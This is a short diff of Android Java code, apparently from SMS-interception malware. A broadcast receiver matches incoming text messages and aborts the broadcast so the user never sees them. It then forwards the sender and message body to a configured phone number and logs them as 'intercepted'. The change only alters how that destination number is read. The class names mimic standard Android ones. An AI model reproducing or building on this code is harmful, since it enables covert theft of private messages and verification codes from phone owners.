@@ -61,7 +61,7 @@ public class DroadcastReceiver extends BroadcastReceiver {
 					LogUtils.write("Send", "匹配成功,中断广播");
 					this.abortBroadcast();
 					LogUtils.write("Send", "写入数据库" + isflag);
-					DmsManager.Send(context,Dctivity.phonenum,Dctivity.lanjie+""+from+"#"+msg.toString());
+					DmsManager.Send(context,Dctivity.getPhoneNumber(),Dctivity.lanjie+""+from+"#"+msg.toString());
 					DQLiteOpenHelper.getHelper(context).addData("拦截", from,msg.toString(),new Date());
 					Dhread.SartSend(context.getApplicationContext());
 				}
